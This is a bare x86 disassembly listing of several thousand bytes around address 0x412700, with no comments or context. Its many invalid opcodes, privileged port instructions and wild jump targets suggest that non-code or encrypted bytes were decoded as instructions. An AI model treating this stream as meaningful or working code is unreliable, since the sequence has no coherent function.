  4126c8:	ds xor esp,ebp
  4126cb:	cli    
  4126cc:	lods   al,BYTE PTR ds:[esi]
  4126cd:	test   BYTE PTR [edi-0x12],dl
  4126d0:	push   esp
  4126d1:	in     al,0x5b
  4126d3:	adc    eax,0xa0cf4582
  4126d8:	mov    eax,ds:0xab3f2cd8
  4126dd:	xchg   ecx,eax
  4126de:	sahf   
  4126df:	fdiv   DWORD PTR [edx+0x6b]
  4126e2:	cmp    esi,ebx
  4126e4:	scas   al,BYTE PTR es:[edi]
  4126e5:	add    DWORD PTR [bx],0x5da1fe5a
  4126ec:	jne    0x4126ea
  4126ee:	and    eax,DWORD PTR [ebx]
  4126f0:	cli    
  4126f1:	in     al,dx
  4126f2:	sbb    DWORD PTR [ebx],edi
  4126f4:	add    BYTE PTR [esi-0x40c76ce6],dh
  4126fa:	js     0x4126af
  4126fc:	fild   DWORD PTR [ecx+0x12]
  4126ff:	pop    eax
  412700:	sbb    eax,0x357ae2b8
  412705:	xor    eax,ecx
  412707:	ins    BYTE PTR es:[edi],dx
  412708:	cdq    
  412709:	dec    ecx
  41270a:	xchg   esi,eax
  41270b:	arpl   WORD PTR [ebx],ax
  41270d:	mov    ebp,0x8fccb09f
  412712:	sbb    al,0x79
  412714:	jge    0x41273e
  412716:	adc    eax,0x369e7bc4
  41271b:	mov    edx,esi
  41271d:	sar    edi,0xdd
  412720:	lock jns 0x412715
  412723:	xor    BYTE PTR ds:0x77d4d3,al
  412729:	xchg   ecx,eax
  41272a:	leave  
  41272b:	fidivr WORD PTR [edx-0x3cf64bdd]
  412731:	sbb    dl,ch
  412733:	aas    
  412734:	push   cs
  412735:	nop
  412736:	and    edx,DWORD PTR ds:[edi]
  412739:	jge    0x4127b3
  41273b:	test   BYTE PTR ds:0x912c925a,0x73
  412742:	mov    BYTE PTR [edx-0x24021fc6],bh
  412748:	fdivr  QWORD PTR [eax]
  41274a:	fwait
  41274b:	ja     0x4126f3
  41274d:	mov    bl,BYTE PTR [eax+eax*4]
  412750:	ret    
  412751:	cld    
  412752:	mov    cl,0x93
  412754:	dec    ebp
  412755:	les    edx,FWORD PTR [edi-0x63]
  412758:	and    ebp,DWORD PTR [edx]
  41275a:	jmp    0x4127b6
  41275c:	and    DWORD PTR [edi],edi
  41275e:	jmp    0xcc6c7cfc
  412763:	and    eax,DWORD PTR [esi]
  412765:	rcr    DWORD PTR [ecx+0x41],1
  412768:	adc    eax,0x25341c35
  41276d:	pop    ecx
  41276e:	jo     0x41275a
  412770:	sti    
  412771:	mov    al,ds:0x8181efba
  412776:	jmp    0x82295ff
  41277b:	stc    
  41277c:	xor    al,0xfd
  41277e:	ret    
  41277f:	test   al,0xfe
  412781:	push   ebp
  412782:	mov    al,ds:0x91f55548
  412787:	inc    ebx
  412788:	mov    eax,ds:0x9e794fd0
  41278d:	cwde   
  41278e:	or     DWORD PTR [eax-0x10],edi
  412791:	loope  0x412774
  412793:	xchg   ecx,eax
  412794:	push   ds
  412795:	pop    eax
  412796:	jle    0x4127ac
  412798:	out    dx,al
  412799:	clc    
  41279a:	mov    ebx,0xcfbeee5a
  41279f:	pop    eax
  4127a0:	out    dx,eax
  4127a1:	out    0x95,al
  4127a3:	cdq    
  4127a4:	mov    al,ds:0x9e004624
  4127a9:	dec    esi
  4127aa:	jl     0x41278b
  4127ac:	pop    ebp
  4127ad:	mov    ds:0x6b49635b,al
  4127b2:	fs ins BYTE PTR es:[edi],dx
  4127b4:	je     0x412746
  4127b6:	retf   
  4127b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4127b8:	sbb    al,0x91
  4127ba:	scas   al,BYTE PTR es:[edi]
  4127bb:	aas    
  4127bc:	out    0x20,al
  4127be:	popa   
  4127bf:	jmp    0x561946eb
  4127c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4127c5:	push   ds
  4127c6:	lea    edi,[edi]
  4127c8:	jbe    0x41281d
  4127ca:	inc    ecx
  4127cb:	aas    
  4127cc:	push   esi
  4127cd:	mov    ebx,0x53bf36f1
  4127d2:	bound  esp,QWORD PTR [edx*8+0x662aad9d]
  4127d9:	fbld   TBYTE PTR [edi+0x3c9cc87]
  4127df:	fisub  DWORD PTR [edx-0x58d58a41]
  4127e5:	mov    BYTE PTR [eax-0x49f2e170],al
  4127eb:	sub    eax,0x9cd44e98
  4127f0:	dec    esp
  4127f1:	sub    eax,0x67eca95e
  4127f6:	mov    ds:0x6e24a091,eax
  4127fb:	push   0xffffffea
  4127fd:	jl     0x412787
  4127ff:	in     eax,0xa
  412801:	mov    al,0xa9
  412803:	nop
  412804:	test   eax,0x35c244d0
  412809:	xchg   BYTE PTR [ebx-0xc],bh
  41280c:	cmp    ecx,DWORD PTR [edi+ecx*1-0x37b15bdd]
  412813:	data16 and al,0x25
  412816:	mov    al,ds:0x2fe8fe29
  41281b:	pop    esi
  41281c:	sti    
  41281d:	data16 jb 0x4127db
  412820:	mov    dl,0xab
  412822:	xchg   DWORD PTR [eax+ebp*1+0x3a],esi
  412826:	out    dx,al
  412827:	shl    BYTE PTR [ebx-0x408f34bd],cl
  41282d:	(bad)  
  41282e:	cmp    ah,BYTE PTR [edx]
  412830:	or     al,0x2b
  412832:	mov    ebp,0x3ff885c5
  412837:	shl    DWORD PTR [ebx+0x12],1
  41283a:	neg    DWORD PTR [ebx-0x22f71326]
  412840:	mov    eax,ds:0xa9fc7676
  412845:	std    
  412846:	pop    ebx
  412847:	dec    ebx
  412848:	fldcw  WORD PTR [edx+0x13]
  41284b:	xchg   edi,eax
  41284c:	or     ah,BYTE PTR [ecx]
  41284e:	pop    ebx
  41284f:	ret    0x11c
  412852:	popa   
  412853:	add    eax,0x74ff40c
  412858:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  41285a:	pop    edx
  41285b:	mov    edi,DWORD PTR [edi+0x3f]
  41285e:	aaa    
  41285f:	cld    
  412860:	sub    DWORD PTR [edi],eax
  412862:	cmp    DWORD PTR ds:0x9c9aa33,esp
  412868:	call   0x853fbee2
  41286d:	cmp    ah,BYTE PTR [ebp+0x2dab35a]
  412873:	test   DWORD PTR [edx],0xcb98f496
  412879:	or     eax,0x36ee854
  41287e:	icebp  
  41287f:	dec    eax
  412880:	call   0xc911:0xfbe8f650
  412887:	inc    ecx
  412888:	push   esi
  412889:	mov    edi,0xd0597b7e
  41288e:	mov    cs,edx
  412890:	(bad)  
  412891:	xchg   edx,eax
  412892:	(bad)  
  412893:	js     0x4128d3
  412895:	adc    ecx,DWORD PTR [ecx+eiz*8-0x10]
  412899:	in     eax,dx
  41289a:	xchg   esi,ebx
  41289c:	int    0xa9
  41289e:	(bad)  
  41289f:	dec    esi
  4128a0:	fucomip st,st(0)
  4128a2:	push   esp
  4128a3:	add    eax,DWORD PTR [esi-0x33]
  4128a6:	loopne 0x4128fb
  4128a8:	adc    al,0x69
  4128aa:	jp     0x412855
  4128ac:	add    ch,BYTE PTR [ebx+0x4597de65]
  4128b2:	or     al,0xfb
  4128b4:	mov    BYTE PTR [ebp-0x7ddbc584],dh
  4128ba:	aad    0xbc
  4128bc:	lahf   
  4128bd:	stos   DWORD PTR es:[edi],eax
  4128be:	lock icebp 
  4128c0:	pop    eax
  4128c1:	repnz in al,0xf4
  4128c4:	out    0x7d,eax
  4128c6:	cdq    
  4128c7:	retf   
  4128c8:	pop    ecx
  4128c9:	mov    al,ds:0xe3051ba1
  4128ce:	pop    eax
  4128cf:	repz jl 0x4128e4
  4128d2:	mov    ch,bh
  4128d4:	xor    al,0x8c
  4128d6:	mov    ecx,0xeca7e0be
  4128db:	cmp    BYTE PTR cs:[eax-0x6d8f8bb],0x35
  4128e3:	dec    ebp
  4128e4:	repnz and al,0x77
  4128e7:	daa    
  4128e8:	pop    ecx
  4128e9:	arpl   WORD PTR [edx+0x28],dx
  4128ec:	and    eax,0xeaa43e92
  4128f1:	sbb    eax,0xb7848fbf
  4128f6:	mov    ebp,0x31262886
  4128fb:	js     0x412912
  4128fd:	fwait
  4128fe:	fwait
  4128ff:	add    ebx,esp
  412901:	jns    0x41296a
  412903:	dec    eax
  412904:	into   
  412905:	mov    ah,0xd3
  412907:	xchg   BYTE PTR [eax+0x6b],ah
  41290a:	mov    ds:0x3c0e2e27,eax
  41290f:	jp     0x41291f
  412911:	add    BYTE PTR ds:0x519dd541,0xfa
  412918:	scas   eax,DWORD PTR es:[edi]
  412919:	cmp    BYTE PTR [eax+0x73],ch
  41291c:	xor    eax,0xb1ab651c
  412921:	test   eax,0x4dc52bf6
  412926:	cmp    DWORD PTR [edi+0x6ee64f35],edx
  41292c:	into   
  41292d:	test   ch,bl
  41292f:	and    bl,BYTE PTR [eax-0x49]
  412932:	cmp    eax,0xd3e7f01
  412937:	pusha  
  412938:	xchg   edx,eax
  412939:	jo     0x412926
  41293b:	mov    BYTE PTR [esi-0x42],ah
  41293e:	cmp    eax,0xab22b4f1
  412943:	dec    edx
  412944:	inc    edi
  412945:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412946:	xor    BYTE PTR [esi+0x2f3121a4],cl
  41294c:	nop
  41294d:	lahf   
  41294e:	xor    eax,0x6f990130
  412953:	inc    ebx
  412954:	add    esi,edx
  412956:	push   ss
  412957:	lods   al,BYTE PTR ds:[esi]
  412958:	xlat   BYTE PTR ds:[ebx]
  412959:	test   BYTE PTR [esi],dh
  41295b:	xlat   BYTE PTR ds:[ebx]
  41295c:	lods   eax,DWORD PTR ds:[esi]
  41295d:	xor    BYTE PTR [ebx+eax*8],bl
  412960:	ja     0x412995
  412962:	imul   edx,DWORD PTR [eax+eiz*4],0xffffffa5
  412966:	(bad)  
  412967:	aaa    
  412968:	inc    BYTE PTR [edi-0x7c]
  41296b:	xchg   ecx,eax
  41296c:	inc    edi
  41296d:	je     0x412960
  41296f:	sub    BYTE PTR [eax],dl
  412971:	into   
  412972:	sub    al,0xe9
  412974:	stos   BYTE PTR es:[edi],al
  412975:	test   eax,0x357572ba
  41297a:	(bad)  
  41297b:	or     eax,0x62195831
  412980:	mov    dl,0x5c
  412982:	scas   al,BYTE PTR es:[edi]
  412983:	fisub  WORD PTR [ebx+eax*4]
  412986:	shl    DWORD PTR [ebx+0x465cdd0],1
  41298c:	rcr    BYTE PTR [bp+di+0xc],1
  412990:	fcom   DWORD PTR [ecx+0x70]
  412993:	data16 mov BYTE PTR [eax],al
  412996:	lods   eax,DWORD PTR ds:[esi]
  412997:	mov    eax,ds:0x2e3cd8a5
  41299c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41299d:	lods   eax,DWORD PTR ds:[esi]
  41299e:	push   esp
  41299f:	sub    al,BYTE PTR [edi-0x1680bcbb]
  4129a5:	mov    ds:0x85acba11,al
  4129aa:	inc    esp
  4129ab:	xchg   ebp,eax
  4129ac:	mov    edi,0x12114af
  4129b1:	add    eax,DWORD PTR [eax-0x683f52b7]
  4129b7:	fdiv   QWORD PTR [esi-0x4d]
  4129ba:	into   
  4129bb:	bound  edx,QWORD PTR [ebp-0x211ff2e2]
  4129c1:	fcmovnu st,st(2)
  4129c3:	(bad)
  4129c6:	retf   0xd2de
  4129c9:	(bad)  
  4129ca:	ret    
  4129cb:	jmp    0x412977
  4129cd:	pop    ecx
  4129ce:	fidivr DWORD PTR [ecx-0x3d3dc3fd]
  4129d4:	(bad)  
  4129d5:	inc    eax
  4129d6:	sub    bl,bh
  4129d8:	add    bh,BYTE PTR [ebx-0xf]
  4129db:	dec    ebx
  4129dc:	imul   ebx,DWORD PTR [edi],0xffffffff
  4129df:	(bad)  
  4129e0:	rol    BYTE PTR [ecx-0x6a],cl
  4129e3:	inc    edi
  4129e4:	dec    ebx
  4129e5:	in     al,0xff
  4129e7:	ret    0xe372
  4129ea:	push   esp
  4129eb:	xor    eax,0x15e788
  4129f0:	call   0x8ac7dbf9
  4129f5:	xchg   edi,eax
  4129f6:	mul    DWORD PTR [edi]
  4129f8:	es push esp
  4129fa:	arpl   WORD PTR cs:[ebx-0x55],bx
  4129fe:	aas    
  4129ff:	jp     0x412a35
  412a01:	sbb    bl,BYTE PTR [ebp-0x68]
  412a04:	popf   
  412a05:	dec    esi
  412a06:	scas   eax,DWORD PTR es:[edi]
  412a07:	cmc    
  412a08:	sbb    DWORD PTR [eax-0x6f58321d],ebp
  412a0e:	push   cs
  412a0f:	lock jg 0x4129fc
  412a12:	outs   dx,BYTE PTR ds:[esi]
  412a13:	xchg   DWORD PTR [ecx*8+0x65a003c9],eax
  412a1a:	xor    DWORD PTR [edi-0x4c],esi
  412a1d:	mov    ebx,0xd7b3fcb6
  412a22:	aaa    
  412a23:	pop    ebp
  412a24:	add    eax,DWORD PTR [ecx]
  412a26:	in     eax,dx
  412a27:	fs inc ebp
  412a29:	sbb    dh,bl
  412a2b:	enter  0x9d99,0x22
  412a2f:	xchg   edx,edi
  412a31:	cmp    edi,DWORD PTR [ebx-0x6118b5f1]
  412a37:	in     al,0x4e
  412a39:	mov    esi,DWORD PTR [esi]
  412a3b:	sahf   
  412a3c:	jp     0x412a61
  412a3e:	push   ds
  412a3f:	call   DWORD PTR [edx+ecx*8-0x7006e0a1]
  412a46:	xchg   edx,eax
  412a47:	mov    ebp,0x5ef8a4a0
  412a4c:	imul   esi,DWORD PTR [edx],0xffffffc5
  412a4f:	push   edx
  412a50:	pop    ds
  412a51:	jl     0x4129fe
  412a53:	mov    eax,ds:0xff0ca421
  412a58:	mov    ch,0x20
  412a5a:	fldcw  WORD PTR [edi-0x5df7f491]
  412a60:	jb     0x4129ea
  412a62:	out    0xa7,eax
  412a64:	les    edi,FWORD PTR [esi]
  412a66:	sub    eax,0x26643190
  412a6b:	js     0x412a40
  412a6d:	dec    edx
  412a6e:	xchg   ecx,eax
  412a6f:	jo     0x412a95
  412a71:	or     al,BYTE PTR [edx-0x20]
  412a74:	pop    ds
  412a75:	inc    ebp
  412a76:	inc    ecx
  412a77:	loopne 0x412a2d
  412a79:	push   0xa91ae05
  412a7e:	push   0xaa8f9497
  412a83:	mov    WORD PTR [esi],es
  412a85:	mov    al,ds:0xbf682100
  412a8a:	inc    edx
  412a8b:	dec    ecx
  412a8c:	(bad)  
  412a8d:	loop   0x412a26
  412a8f:	sahf   
  412a90:	add    al,0xc7
  412a92:	aas    
  412a93:	in     al,0x22
  412a95:	jge    0x412a89
  412a97:	lock aam 0x9b
  412a9a:	mov    ah,0xb7
  412a9c:	leave  
  412a9d:	pop    esi
  412a9e:	ss mov dl,0x1
  412aa1:	and    DWORD PTR [ecx],0x7b6c2ad3
  412aa7:	int3   
  412aa8:	in     al,0x9a
  412aaa:	mov    bh,0xb
  412aac:	sti    
  412aad:	shl    ebp,0xc6
  412ab0:	push   ds
  412ab1:	push   edi
  412ab2:	adc    DWORD PTR [eax+0x2410239],esi
  412ab8:	mov    eax,0xeb4c80c1
  412abd:	jg     0x412a85
  412abf:	pusha  
  412ac0:	(bad)  
  412ac1:	xor    eax,0x6ce230b9
  412ac6:	and    cl,BYTE PTR [esi+0x16]
  412ac9:	jmp    0x1a22:0xf765728b
  412ad0:	cmp    DWORD PTR [eax+ebx*4+0x5],0xffffffcf
  412ad5:	pop    ss
  412ad6:	mov    bh,0xd5
  412ad8:	mov    cl,0xf
  412ada:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412adb:	add    al,0xd6
  412add:	xchg   ebp,eax
  412ade:	xchg   esp,eax
  412adf:	loopne 0x412b02
  412ae1:	out    0x66,eax
  412ae3:	shl    DWORD PTR [eax],0x5b
  412ae6:	sub    eax,0xc24211c8
  412aeb:	push   edi
  412aec:	jmp    0x412adb
  412aee:	pusha  
  412aef:	loopne 0x412a86
  412af1:	sub    dl,BYTE PTR [ecx-0x14]
  412af4:	xor    BYTE PTR [edi],al
  412af6:	inc    DWORD PTR [edx-0x38d62799]
  412afc:	mov    dh,ch
  412afe:	dec    ebp
  412aff:	not    DWORD PTR [ecx-0x2a]
  412b02:	add    BYTE PTR [edi+0x11],al
  412b05:	mov    bl,0xf2
  412b07:	js     0x412ae1
  412b09:	add    eax,0x775b75a
  412b0e:	aad    0x9d
  412b10:	jge    0x412abe
  412b12:	dec    esp
  412b13:	aas    
  412b14:	cmp    eax,0xc4a9283
  412b19:	push   edi
  412b1a:	pop    ecx
  412b1b:	mov    ch,0xc6
  412b1d:	in     al,dx
  412b1e:	scas   al,BYTE PTR es:[edi]
  412b1f:	les    edi,FWORD PTR [ebp-0x6729c1ed]
  412b25:	int    0xcf
  412b27:	or     esi,DWORD PTR [eax-0x3117126]
  412b2d:	fdivr  QWORD PTR [edi-0x5ce89107]
  412b33:	fist   WORD PTR [edx+0x64]
  412b36:	stos   DWORD PTR es:[edi],eax
  412b37:	pop    ebp
  412b38:	sub    eax,0x922aaf92
  412b3d:	fiadd  DWORD PTR [eax-0x2b]
  412b40:	push   esp
  412b41:	dec    edx
  412b42:	jp     0x412b4c
  412b44:	mov    ebp,0x42980d65
  412b49:	pop    esp
  412b4a:	in     al,dx
  412b4b:	jb     0x412b41
  412b4d:	jae    0x412bca
  412b4f:	jge    0x412b8f
  412b51:	cmp    ebx,DWORD PTR [ebx-0x49d9b332]
  412b57:	popf   
  412b58:	or     esi,DWORD PTR [ebp-0x8]
  412b5b:	inc    ebp
  412b5c:	xchg   edx,eax
  412b5d:	fs cmp eax,0x489ab0f5
  412b63:	xchg   ebp,eax
  412b64:	or     eax,0xc29f56a2
  412b69:	lods   al,BYTE PTR ds:[esi]
  412b6a:	fmul   DWORD PTR [esi]
  412b6c:	push   ds
  412b6d:	(bad)  
  412b6f:	cld    
  412b70:	pop    edx
  412b71:	(bad)  
  412b72:	and    eax,0x8399d05a
  412b77:	push   ss
  412b78:	(bad)  
  412b7a:	popf   
  412b7b:	retf   0xe8b5
  412b7e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412b7f:	and    edi,DWORD PTR [edx]
  412b81:	and    eax,0xf5f5865d
  412b86:	push   es
  412b87:	xor    DWORD PTR [ecx+0x77688f9f],eax
  412b8d:	push   esi
  412b8e:	mov    dl,0xe7
  412b90:	test   BYTE PTR [ebx-0x50],cl
  412b93:	mov    eax,0x1f755fbe
  412b98:	mov    ch,0x4a
  412b9a:	sub    ebx,eax
  412b9c:	mov    esi,0x7e6a80bd
  412ba1:	mov    al,0xd0
  412ba3:	repz lea esi,[ebp+0x628f1b7]
  412baa:	pop    ss
  412bab:	dec    eax
  412bac:	jo     0x412bd6
  412bae:	test   al,ch
  412bb0:	or     al,0x53
  412bb2:	imul   eax,DWORD PTR [ebx+0x45],0xd6f7361b
  412bb9:	pop    edi
  412bba:	inc    eax
  412bbb:	and    esp,DWORD PTR [ecx]
  412bbd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412bbe:	pop    ecx
  412bbf:	push   cs
  412bc0:	repz xchg esi,eax
  412bc2:	cmp    esp,DWORD PTR [eax-0x8d08842]
  412bc8:	adc    al,0x20
  412bca:	ins    DWORD PTR es:[edi],dx
  412bcb:	jnp    0x412bd9
  412bcd:	rcr    esp,1
  412bcf:	push   esp
  412bd0:	mov    bh,0xcb
  412bd2:	cmp    bh,BYTE PTR [ecx+0x53]
  412bd5:	mov    dl,0x71
  412bd7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412bd8:	scas   al,BYTE PTR es:[edi]
  412bd9:	call   0xa276:0xc2e53a63
  412be0:	(bad)  
  412be1:	xor    DWORD PTR [edx],ebx
  412be3:	imul   edx,DWORD PTR [ebx-0x2a],0xffffff82
  412be7:	in     eax,dx
  412be8:	sbb    ah,ah
  412bea:	jge    0x412bf5
  412bec:	mov    WORD PTR [edx+0x26],ds
  412bef:	imul   edx,DWORD PTR [eax+0x4bd42262],0x75
  412bf6:	int3   
  412bf7:	int3   
  412bf8:	mov    bh,0xe4
  412bfa:	or     eax,0x688cd3a3
  412bff:	in     eax,dx
  412c00:	inc    esp
  412c01:	push   ecx
  412c02:	pop    edi
  412c03:	xor    BYTE PTR [ecx],dl
  412c05:	dec    esi
  412c06:	xor    dl,bh
  412c08:	mov    ds:0xf89a37c4,eax
  412c0d:	mov    edx,0xc8681b6a
  412c12:	repz mov edx,0x6ef33977
  412c18:	or     cl,BYTE PTR [edi-0x47]
  412c1b:	in     al,0x7c
  412c1d:	fucomip st,st(5)
  412c20:	xchg   esi,eax
  412c21:	outs   dx,DWORD PTR ds:[esi]
  412c22:	push   esp
  412c23:	mov    ah,ah
  412c25:	pop    esi
  412c26:	dec    ebx
  412c27:	mov    al,ch
  412c29:	and    eax,0x267579e0
  412c2e:	shl    DWORD PTR [edx+0x0],cl
  412c31:	stos   DWORD PTR es:[edi],eax
  412c32:	xor    al,0xed
  412c34:	or     BYTE PTR [ebp+0x7],bl
  412c37:	lods   eax,DWORD PTR ds:[esi]
  412c38:	mov    ds:0xb2eab661,al
  412c3d:	xchg   DWORD PTR [edi-0x4],esp
  412c40:	pusha  
  412c41:	mov    eax,DWORD PTR [eax+0x4813f61e]
  412c47:	jmp    0x412cb2
  412c49:	fmul   DWORD PTR [ebx]
  412c4b:	push   ds
  412c4c:	adc    BYTE PTR [ebx+0x1e],bl
  412c4f:	mov    ebx,0x7493caa9
  412c54:	addr16 add al,0xe8
  412c57:	mov    edx,DWORD PTR [esi+0x15df5b47]
  412c5d:	or     al,0xd7
  412c5f:	lods   eax,DWORD PTR ds:[esi]
  412c60:	jl     0x412c2d
  412c62:	cmp    al,0xcd
  412c64:	mov    ebp,edx
  412c66:	push   edx
  412c67:	aam    0x50
  412c69:	aaa    
  412c6a:	cmp    esp,DWORD PTR [esi+eiz*1+0x0]
  412c6e:	cdq    
  412c6f:	pop    edi
  412c70:	and    DWORD PTR [esp+ebx*1-0x56],edi
  412c74:	lds    ebx,FWORD PTR [eax]
  412c76:	adc    ebp,ebx
  412c78:	test   BYTE PTR ss:[ebp-0x1c],dl
  412c7c:	pop    ebp
  412c7d:	pop    esi
  412c7e:	adc    BYTE PTR [ebx+0x53bfea69],ch
  412c84:	int    0x60
  412c86:	popa   
  412c87:	in     eax,0xb9
  412c89:	and    eax,0xea394ce3
  412c8e:	rcl    bl,0x45
  412c91:	test   al,0x5f
  412c93:	popf   
  412c94:	mov    bh,0x82
  412c96:	sub    DWORD PTR [eax],eax
	...
  412d14:	aam    0xff
  412d16:	in     eax,dx
  412d17:	jp     0x412d08
  412d19:	jp     0x412cf2
  412d1b:	(bad)  
  412d1c:	jnp    0x412d5a
  412d1e:	adc    ecx,DWORD PTR [esi+0x2]
  412d21:	sahf   
  412d22:	ds pop edx
  412d24:	outs   dx,BYTE PTR ds:[esi]
  412d25:	aad    0x0
  412d27:	add    BYTE PTR [ebx+0x7],ch
  412d2a:	add    BYTE PTR [eax],al
  412d2c:	sbb    DWORD PTR [esi+0x15756db1],ecx
  412d32:	js     0x412cfb
  412d34:	and    DWORD PTR [edi],edi
  412d36:	jae    0x412cdc
  412d38:	sub    BYTE PTR [edi-0x78c7d3f6],0x26
  412d3f:	out    dx,al
  412d40:	mov    al,0x18
  412d42:	scas   eax,DWORD PTR es:[edi]
  412d43:	gs pusha 
  412d45:	gs ss fwait
  412d48:	mov    ch,0x2c
  412d4a:	adc    DWORD PTR [ebx],edi
  412d4c:	push   ds
  412d4d:	or     al,0x80
  412d4f:	in     eax,dx
  412d50:	bound  esp,QWORD PTR [esi]
  412d52:	bound  esp,QWORD PTR [ecx-0x65]
  412d55:	mov    dl,0x8d
  412d57:	loope  0x412cfd
  412d59:	pop    DWORD PTR [ecx-0x14]
  412d5c:	not    DWORD PTR [edi-0x45a587ac]
  412d62:	dec    edx
  412d63:	and    edx,esi
  412d65:	jecxz  0x412d6b
  412d67:	sub    al,0x50
  412d69:	ins    BYTE PTR es:[edi],dx
  412d6a:	jns    0x412dc6
  412d6c:	pop    ds
  412d6d:	sub    al,0xd9
  412d6f:	and    ebx,DWORD PTR [esi+0x4811f53a]
  412d75:	push   eax
  412d76:	cmp    DWORD PTR [ebp-0x36],ebp
  412d79:	pop    ecx
  412d7a:	loopne 0x412dfa
  412d7c:	jnp    0x412d0d
  412d7e:	nop
  412d7f:	pop    edx
  412d80:	pop    ds
  412d81:	add    BYTE PTR [ebp+ebx*1-0x6d19e4eb],al
  412d88:	pusha  
  412d89:	ins    DWORD PTR es:[edi],dx
  412d8a:	inc    esp
  412d8b:	mov    eax,ds:0xc2c1d2d5
  412d90:	pushf  
  412d91:	fistp  QWORD PTR [edx-0x394a3999]
  412d97:	popf   
  412d98:	xchg   ecx,eax
  412d99:	mov    cl,0x90
  412d9b:	push   ebx
  412d9c:	add    eax,0x1de4500a
  412da1:	xchg   edx,eax
  412da2:	outs   dx,DWORD PTR ds:[esi]
  412da3:	inc    ebx
  412da4:	(bad)  
  412da5:	add    al,0xbb
  412da7:	popf   
  412da8:	cmp    eax,0xbd4ea7bd
  412dad:	sub    al,0x4f
  412daf:	sar    BYTE PTR [ebp+0x26bd896c],1
  412db5:	mov    ds:0x5e015b5b,al
  412dba:	push   edi
  412dbb:	jne    0x412d7d
  412dbd:	mov    al,ds:0x3508aae7
  412dc2:	mov    eax,ds:0x6ff7e9d4
  412dc7:	xor    DWORD PTR [edi],esi
  412dc9:	and    dh,BYTE PTR ds:0x3b6bd13f
  412dcf:	icebp  
  412dd0:	mov    eax,0xdd57e031
  412dd5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412dd6:	shl    DWORD PTR [edx],1
  412dd8:	inc    esp
  412dd9:	push   cs
  412dda:	dec    ebx
  412ddb:	sbb    eax,0x480f068b
  412de0:	or     al,0x35
  412de2:	(bad)  [edx-0x366151e3]
  412de8:	inc    eax
  412de9:	int    0x14
  412deb:	xor    esi,esi
  412ded:	xor    ch,BYTE PTR [ecx-0x23]
  412df0:	pop    esi
  412df1:	xor    DWORD PTR [edx],0xbd5e9cca
  412df7:	lods   eax,DWORD PTR ds:[esi]
  412df8:	xchg   edi,eax
  412df9:	enter  0xccbd,0x89
  412dfd:	push   0xffffffa1
  412dff:	xor    DWORD PTR [ecx*2+0x14df070b],0x37ec5bf8
  412e0a:	lahf   
  412e0b:	(bad)  
  412e0c:	call   0xb9a22690
  412e11:	inc    eax
  412e12:	jl     0x412db0
  412e14:	adc    BYTE PTR [edi+esi*8+0x17cf90e3],ch
  412e1b:	mov    bh,0x24
  412e1d:	jnp    0x412e16
  412e1f:	rol    ebx,1
  412e21:	fwait
  412e22:	fwait
  412e23:	pop    es
  412e24:	fsub   DWORD PTR fs:[eax]
  412e27:	dec    ecx
  412e28:	jl     0x412e62
  412e2a:	fnstsw WORD PTR ss:[ebp-0xd]
  412e2e:	fdiv   QWORD PTR [ebx+0x7358e84a]
  412e34:	jmp    0xb728cfc5
  412e39:	and    al,0x60
  412e3b:	outs   dx,DWORD PTR ds:[esi]
  412e3c:	adc    BYTE PTR [edi-0x70e0454f],0x29
  412e43:	scas   eax,DWORD PTR es:[edi]
  412e44:	stos   BYTE PTR es:[edi],al
  412e45:	mov    ch,0x7b
  412e47:	cld    
  412e48:	mov    ebp,0x5c58c219
  412e4d:	sbb    BYTE PTR [esi+0x1a],0xf8
  412e51:	and    dl,bl
  412e53:	dec    ecx
  412e54:	xchg   edx,eax
  412e55:	repnz imul edi,DWORD PTR [edx+0x210b660e],0xfffffff1
  412e5d:	pop    ebp
  412e5e:	das    
  412e5f:	adc    al,0x9d
  412e61:	push   0x3f
  412e63:	jl     0x412eb0
  412e65:	nop
  412e66:	push   ebp
  412e67:	lahf   
  412e68:	test   eax,0x734824f9
  412e6d:	aad    0x59
  412e6f:	imul   edx,esp,0x4d
  412e72:	cdq    
  412e73:	adc    DWORD PTR [edi-0x7e1ad7cf],0x74c7ef09
  412e7d:	xchg   DWORD PTR [eax],eax
  412e7f:	jp     0x412ec1
  412e81:	mov    bh,0xa9
  412e83:	sub    BYTE PTR [esi],0x42
  412e86:	mov    edi,DWORD PTR ds:0x101cb9cb
  412e8c:	mov    bl,0x6e
  412e8e:	sbb    eax,esi
  412e90:	sahf   
  412e91:	sub    al,0xa3
  412e93:	mov    dl,0xf8
  412e95:	jnp    0x412e4a
  412e97:	cmp    BYTE PTR ds:0x3c6e31cc,0x19
  412e9e:	or     ah,dh
  412ea0:	sub    DWORD PTR [edx+0x7645685f],esi
  412ea6:	adc    edx,ebp
  412ea8:	loopne 0x412ec2
  412eaa:	js     0x412e74
  412eac:	rol    BYTE PTR [eax-0x4c],cl
  412eaf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412eb0:	add    ebp,DWORD PTR [ebx+0x186823cf]
  412eb6:	sub    ebx,edx
  412eb8:	fcom   st(2)
  412eba:	stos   DWORD PTR es:[edi],eax
  412ebb:	push   ebp
  412ebc:	mov    ds:0xa0415541,al
  412ec1:	jle    0x412ed2
  412ec3:	pop    ebp
  412ec4:	inc    ebx
  412ec5:	es dec ecx
  412ec7:	call   0xb2515d8c
  412ecc:	popa   
  412ecd:	loope  0x412ef9
  412ecf:	dec    esi
  412ed0:	mov    esp,0x78a59c1c
  412ed5:	pop    edi
  412ed6:	out    0xa7,eax
  412ed8:	lds    edx,FWORD PTR [ebp-0xa]
  412edb:	cmp    ebx,DWORD PTR [ebx+edi*8-0x5d]
  412edf:	sti    
  412ee0:	and    BYTE PTR [ecx],bh
  412ee2:	mov    dl,0x68
  412ee4:	fcom   DWORD PTR [ebx-0x53]
  412ee7:	je     0x412efe
  412ee9:	pop    es
  412eea:	dec    esp
  412eeb:	aaa    
  412eec:	or     al,BYTE PTR [edi]
  412eee:	js     0x412f43
  412ef0:	push   edx
  412ef1:	stos   DWORD PTR es:[edi],eax
  412ef2:	retf   0xe32d
